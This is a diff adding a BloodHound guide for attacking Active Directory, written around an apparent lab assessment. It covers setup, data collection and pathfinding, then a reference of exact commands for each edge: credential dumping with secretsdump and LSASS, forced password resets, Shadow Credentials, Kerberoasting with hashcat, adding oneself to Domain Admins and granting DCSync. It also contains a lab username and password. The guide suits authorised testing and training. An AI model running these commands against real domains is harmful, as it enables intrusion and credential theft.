@@ -1,0 +1,231 @@
+---
+title: "BloodHound — Complete Guide (Setup → Collection → Every Edge → Abuse)"
+---
+
+> BloodHound maps Active Directory as a **graph**: *who can do what to whom*. You collect data with a "SharpHound" collector, import it, mark accounts you control as **Owned**, and ask "what's the shortest path from me to Domain Admin?" This guide covers **install (both versions)**, **collection (Windows + Linux + over a pivot)**, **how to drive the UI**, and — the core — **every edge type with the exact command to abuse it**.
+
+---
+
+## ⏱️ DECISION HEADER
+
+| You want to… | Do |
+|---|---|
+| Install BloodHound | [CE (Docker)](#ce-bloodhound-community-edition-docker) or [Legacy (neo4j)](#legacy-bloodhound-neo4j--electron) |
+| Collect data from Kali (have creds) | [`bloodhound-python`](#b-bloodhound-python-from-linuxkali--remote) |
+| Collect data from a Windows shell | [`SharpHound`](#a-sharphound-on-the-windows-host) |
+| Collect through a chisel/proxychains pivot | [over a pivot](#collecting-over-a-pivot) |
+| Find the path to Domain Admin | [Pathfinding & queries](#5-finding-attack-paths) |
+| "I have edge X, how do I abuse it?" | [The Edge → Abuse reference](#6-the-edge--abuse-reference-the-important-part) |
+| Skip the GUI, just check ACLs fast | [`bloodyAD get writable`](#no-gui-shortcut-bloodyad) |
+
+---
+
+## 0. CONCEPTS
+
+- **Nodes** = objects: Users, Groups, Computers, OUs, GPOs, Domains, (CertTemplates/CAs in CE).
+- **Edges** = relationships/rights: `MemberOf`, `AdminTo`, `GenericAll`, `ForceChangePassword`, `AddKeyCredentialLink`, `DCSync`, etc. **An edge is a permission one node has over another.**
+- **Attack path** = a chain of edges from something you control to something valuable (Domain Admins, the domain object, a high‑value host).
+- **Direction matters.** An edge points **from the principal that holds the right → to the target**. *Inbound* edges to your user (admins → you) are normal and useless. You want **outbound** edges *from your owned accounts*. (This is the mistake that cost us time in the assessment — bdavid's inbound graph looked powerful but was just "admins control bdavid.")
+- **Owned principals** = accounts whose creds you have. Mark them Owned so BloodHound can compute paths *from your foothold*.
+
+---
+
+## 1. INSTALL
+
+### CE (BloodHound Community Edition, Docker) — current/recommended
+```bash
+sudo apt install -y docker.io docker-compose          # 'docker-compose' is the v2 standalone on Kali
+sudo systemctl start docker
+curl -L https://ghst.ly/getbhce -o ~/bh.compose.yml   # note: saves as bh.compose.yml (dot)
+sudo docker-compose -f ~/bh.compose.yml up -d
+sudo docker-compose -f ~/bh.compose.yml logs | grep -i "Initial Password"   # one-time admin pw
+```
+- Browse **http://localhost:8080**, log in `admin` + that password, set a new one.
+- Upload data: **gear (Settings) → Administration → File Ingest → Upload File(s)** → your `.zip`.
+- **Compatibility:** CE needs CE‑format data → collect with **`bloodhound-ce-python`** or a recent **SharpHound CE**. A legacy `bloodhound-python` zip may be rejected — if so, re‑collect with the CE collector.
+
+### Legacy BloodHound (neo4j + Electron)
+```bash
+sudo apt install -y bloodhound neo4j
+sudo neo4j start                       # browse http://localhost:7474, login neo4j/neo4j, set new pw
+bloodhound &                           # GUI: connect bolt://localhost:7687 with neo4j creds
+```
+- Import: **drag the `.zip` onto the window**, or **Upload Data** (top‑right up‑arrow).
+- Legacy matches the classic `bloodhound-python` / `SharpHound.exe` output.
+
+> Which to use? CE if you can spare the Docker setup (better UI, newer edges). Legacy if you want one `apt install` and guaranteed match with the classic Python collector. **Pick the collector that matches the UI version.**
+
+---
+
+## 2. DATA COLLECTION
+
+### A. SharpHound on the Windows host
+```cmd
+:: .exe
+.\SharpHound.exe -c All --zipfilename loot
+:: stealthier / specific:
+.\SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\Temp
+:: PowerShell version
+powershell -ep bypass -c "Import-Module .\SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -ZipFileName loot.zip"
+```
+Collection methods: `Default`, `All`, `Session` (logged‑in users — re‑run periodically), `LoggedOn`, `ACL`, `DCOnly` (LDAP‑only, no host touch — quiet), `GPOLocalGroup`. Then exfil the zip ([Pivoting cheatsheet] `download`).
+
+### B. bloodhound-python (from Linux/Kali — remote)
+```bash
+# legacy UI:
+bloodhound-python -u bdavid -p 'caramel-cigars-reply1' -d nexura.htb -ns 172.16.119.11 -c All --zip
+# CE UI:
+pipx install bloodhound-ce
+bloodhound-ce-python -u bdavid -p 'caramel-cigars-reply1' -d nexura.htb -ns 172.16.119.11 -c All --zip
+```
+Flags: `-ns` = DNS server (point at the DC), `-d` domain, `-c All`, `--zip`, `--dns-tcp` (over a pivot), `-dc <fqdn>` if name resolution is odd, `--hashes LM:NT` for PtH, `-k` for Kerberos/ccache.
+
+### Collecting over a pivot
+```bash
+# SOCKS proxy must be up; DNS must reach the DC -> use --dns-tcp
+proxychains bloodhound-python -u bdavid -p '...' -d nexura.htb -ns 172.16.119.11 -c All --zip --dns-tcp
+```
+> Common failures over a pivot: **DNS** (add `--dns-tcp`, set `-ns <DC>`), and **timeouts** (the `-c All` Session/LoggedOn collection hits every host; use `-c DCOnly` if hosts are slow/filtered). If `-c All` hangs, `-c DCOnly` still gives you all ACL/group/trust data — enough for most paths.
+
+---
+
+## 3. IMPORT & 4. DRIVE THE UI
+
+1. Import the zip (CE: File Ingest · Legacy: drag‑drop).
+2. **Search** a node (top bar): type `bdavid` → select `BDAVID@NEXURA.HTB`.
+3. **Node panel** (click a node) shows tabs: **Outbound Object Control** (what *it* can do — what you care about), **Inbound Object Control** (who can do things *to it*), **Group Membership**, **Reachable High Value Targets**, **Execution Privileges** (CanRDP/CanPSRemote).
+4. **Mark as Owned:** right‑click your foothold accounts → **Mark as Owned**. Do this for *every* cred you have — it powers "from owned" pathfinding.
+5. **Mark High Value** for custom targets if needed (DA/Domain are HVT by default).
+
+> Reading tip: you almost always want a node's **Outbound Object Control** and **Reachable High Value Targets**. If those are empty for your owned accounts, your foothold has no direct ACL power and the path runs through someone else (e.g., in the assessment the real edge was **stom → MemberOf → Domain Admins**, reached via dumping stom's creds, not via an ACL).
+
+---
+
+## 5. Finding attack paths
+
+- **PATHFINDING tab:** set **Start = your owned user**, **End = `DOMAIN ADMINS@DOMAIN`** (or `DC01.DOMAIN`). It draws the exploitable chain.
+- **Prebuilt queries** (Analysis tab / Cypher): "Shortest Paths to Domain Admins", **"Shortest Paths from Owned Principals"**, "Find Principals with DCSync Rights", "Kerberoastable Accounts", "AS‑REP Roastable", "Computers where Domain Users are Local Admin", "Find Workstations where Domain Users can RDP".
+
+**Handy Cypher (paste into the Cypher box):**
+```cypher
+// everything my owned users can reach
+MATCH p=shortestPath((u {owned:true})-[*1..]->(t {highvalue:true})) RETURN p
+// who can DCSync the domain
+MATCH (u)-[:DCSync|GetChanges|GetChangesAll]->(d:Domain) RETURN u.name
+// kerberoastable users
+MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames
+// AS-REP roastable
+MATCH (u:User {dontreqpreauth:true}) RETURN u.name
+// computers where a principal is local admin
+MATCH (u)-[:AdminTo]->(c:Computer) RETURN u.name, c.name
+// shortest path between two specific nodes
+MATCH p=shortestPath((a {name:"BDAVID@NEXURA.HTB"})-[*1..]->(b {name:"DOMAIN ADMINS@NEXURA.HTB"})) RETURN p
+```
+
+### No‑GUI shortcut: bloodyAD
+Don't want to stand up the whole stack? `bloodyAD` shows actionable control directly:
+```bash
+pipx install bloodyAD
+proxychains bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get writable     # what you can modify
+proxychains bloodyAD --host <DC> -d <domain> -u <user> -p '<pass>' get object <target> --attr memberOf
+```
+
+---
+
+## 6. THE EDGE → ABUSE REFERENCE (the important part)
+
+> For each edge BloodHound shows, here's **what it means** and the **exact command** to weaponize it. All commands run from Kali (prefix `proxychains` if pivoting). Substitute `<DC>`, `<domain>`, your `<user>:<pass>`, and `<target>`.
+
+### Group & access edges
+| Edge | Meaning | Abuse |
+|---|---|---|
+| **MemberOf** | You're in a group → you inherit its rights | Nothing to do — you already have the group's power (e.g. stom ∈ Domain Admins ⇒ DCSync) |
+| **AdminTo** | You're local admin on that computer | `evil-winrm`/`psexec`/`wmiexec` → dump creds: `nxc smb <host> -u u -p p --sam --lsa` |
+| **CanRDP** | You may RDP to that host | `xfreerdp3 /v:<host> /u:u /p:'p'` (port‑forward/ligolo) |
+| **CanPSRemote** | WinRM allowed | `evil-winrm -i <host> -u u -p p` |
+| **ExecuteDCOM** | DCOM lateral exec | `impacket-dcomexec` / Invoke‑DCOM |
+| **HasSession** | That user has a session on a box you control → their creds are in LSASS | get SYSTEM there → `sekurlsa::logonpasswords` |
+| **SQLAdmin** | You're sysadmin on MSSQL | `mssqlclient -windows-auth`; `xp_cmdshell` / `enable_xp_cmdshell` |
+
+### ACL / object‑control edges (the escalation bread‑and‑butter)
+| Edge | What it grants | Abuse command |
+|---|---|---|
+| **GenericAll** (on user) | Full control | Reset pw, or **Shadow Credentials**, or **targeted Kerberoast** (below) |
+| **GenericAll** (on group) | Add members | `bloodyAD ... add groupMember "<group>" <youruser>` |
+| **GenericAll** (on computer) | Full control | **RBCD** or **Shadow Credentials** on the computer |
+| **GenericWrite** (on user) | Write attributes | **targeted Kerberoast** (set SPN) or **Shadow Credentials** |
+| **WriteDacl** | Rewrite the object's DACL | grant yourself GenericAll/DCSync: `dacledit`/`bloodyAD add genericAll` |
+| **WriteOwner** | Become the owner | set owner→you, then grant rights: `owneredit` then `dacledit` |
+| **Owns** | You own it | same as WriteOwner path |
+| **ForceChangePassword** | Reset their password (no old pw) | `bloodyAD ... set password <target> 'NewPass123!'` or `net rpc password` |
+| **AddMember** | Add to a group | `bloodyAD ... add groupMember "<group>" <youruser>` |
+| **AddKeyCredentialLink** | Write `msDS-KeyCredentialLink` → **Shadow Credentials** | `certipy shadow auto -u u@dom -p p -account <target> -dc-ip <DC>` |
+| **AddSelf** | Add yourself to a group | `bloodyAD ... add groupMember "<group>" <youruser>` |
+| **AllExtendedRights** | All extended rights (incl. ForceChangePassword, GetChanges) | reset pw, or DCSync if on the domain |
+| **ReadLAPSPassword** | Read the local admin pw (LAPS) | `nxc ldap <DC> -u u -p p -M laps` / `bloodyAD get object <comp> --attr ms-Mcs-AdmPwd` |
+| **ReadGMSAPassword** | Read a gMSA managed password | `nxc ldap <DC> -u u -p p --gmsa` / `gMSADumper.py` |
+
+### Delegation & domain edges
+| Edge | Meaning | Abuse |
+|---|---|---|
+| **AllowedToDelegate** | Constrained delegation (S4U2Proxy) | `impacket-getST -spn <spn> -impersonate Administrator 'dom/user:pass'` |
+| **AllowedToAct** (RBCD) | You can configure RBCD on the target computer | add a controlled computer, set `msDS-AllowedToActOnBehalfOfOtherIdentity`, then `getST -impersonate Administrator` |
+| **DCSync / GetChanges / GetChangesAll** | Replicate secrets from the DC | `impacket-secretsdump 'dom/user:pass'@<DC>` (dumps everything incl. krbtgt) |
+| **GPLink / WriteGPLink / GPO control** | Control a GPO applied to objects | abuse with `pyGPOAbuse` / `SharpGPOAbuse` → add local admin / run as SYSTEM |
+| **Contains** (OU) + ACL on OU | Control objects in the OU | apply rights down to child objects |
+
+### The three reusable "I control a user" primitives
+When you have **GenericAll / GenericWrite / WriteDacl / WriteOwner / Owns** over a *user*, pick one:
+
+**1. Force‑change their password** (loud, breaks their login):
+```bash
+proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' set password <target> 'Newpass123!'
+# or:  net rpc password <target> 'Newpass123!' -U '<domain>/<you>%<pass>' -S <DC>
+```
+**2. Shadow Credentials** (stealthier — no password change; gives you a TGT *and* their NT hash via UnPAC):
+```bash
+proxychains certipy shadow auto -u <you>@<domain> -p '<pass>' -account <target> -dc-ip <DC>
+#   -> prints the target's NT hash. (pywhisker + gettgtpkinit is the manual equivalent.)
+```
+**3. Targeted Kerberoast** (GenericWrite → set a fake SPN, roast, then remove it):
+```bash
+proxychains python3 targetedKerberoast.py -d <domain> -u <you> -p '<pass>' --request-user <target>
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+### Group → DCSync chain (what we'd have done with bdavid if those edges were outbound)
+```bash
+# 1. add yourself to a powerful group (GenericAll/AddMember on it)
+proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' add groupMember "Domain Admins" <you>
+# 2. or grant DCSync rights directly (WriteDacl on the domain)
+proxychains bloodyAD --host <DC> -d <domain> -u <you> -p '<pass>' add dcsync <you>
+# 3. then replicate
+proxychains impacket-secretsdump '<domain>/<you>:<pass>'@<DC> -just-dc-user Administrator
+```
+
+---
+
+## 7. TROUBLESHOOTING
+
+| Symptom | Cause | Fix |
+|---|---|---|
+| `bloodhound-python ... socket connection error / timed out` | `-dc-ip`/`-ns` pointed at a non‑DC, or no route | point `-ns` at the **DC**; ensure pivot up; `--dns-tcp` |
+| File Ingest rejects the zip (CE) | collector version ≠ UI version | re‑collect with `bloodhound-ce-python` / SharpHound‑CE |
+| `bloodhound` GUI won't connect | neo4j not started / wrong bolt creds | `sudo neo4j start`; use `bolt://localhost:7687` |
+| `docker compose` unknown flag | compose plugin missing | `apt install docker-compose`; use `docker-compose -f ...` |
+| compose file "not found" | filename typo (`bh.compose.yml` vs `bh-compose.yml`) | match the exact name `curl -o` saved |
+| Collection over pivot very slow/hangs | `-c All` touches every host | use `-c DCOnly` (still gives ACLs/groups/trusts) |
+| Kerberos collection fails | clock skew | sync to the DC (`ntpdate`/`date -u`), then `-k` |
+| Everything "owned" path empty | didn't mark accounts Owned | right‑click → Mark as Owned, re‑run "from Owned" |
+
+---
+
+## 🧠 BloodHound mindset
+1. **Collect with the matching collector** (CE‑python for CE, classic for legacy).
+2. **Mark every cred you hold as Owned** — paths are only as useful as your known footholds.
+3. **Outbound edges from owned nodes** are the prize; inbound edges to you are noise.
+4. **Most escalations are one of three primitives:** reset password, **Shadow Credentials**, or **add‑to‑group → DCSync**.
+5. **Short domains have short paths** — in the assessment, BloodHound instantly showed `stom ∈ Domain Admins` and `bdavid AdminTo JUMP01`, which *was* the whole solution.
+6. When you don't want the GUI, **`bloodyAD get writable`** answers "what can I abuse?" in one line.
+
+> See also: [AD Attack Path - Worked Example](/cheatsheets/ad-attack-path-worked-example) · [Windows Post-Exploitation](/cheatsheets/windows-post-exploitation) · [Pass the Certificate](/password-attacks/pass-the-certificate)
